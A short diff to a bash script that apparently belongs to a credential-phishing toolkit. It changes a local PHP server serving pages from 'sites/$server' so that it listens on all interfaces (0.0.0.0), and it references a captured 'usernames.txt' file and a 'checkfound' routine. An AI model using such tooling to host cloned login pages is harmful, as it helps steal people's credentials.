@@ -228,8 +228,8 @@ rm -rf sites/$server/usernames.txt
 fi
 
 printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
-cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 & 
-printf "\e[1;92m[\e[0m*\e[1;92m] Server started at http://127.0.0.1:3333/\n"
+cd sites/$server && php -S 0.0.0.0:3333 > /dev/null 2>&1 & 
+printf "\e[1;92m[\e[0m*\e[1;92m] Server started at http://0.0.0.0:3333/\n"
 sleep 1
 checkfound
 }
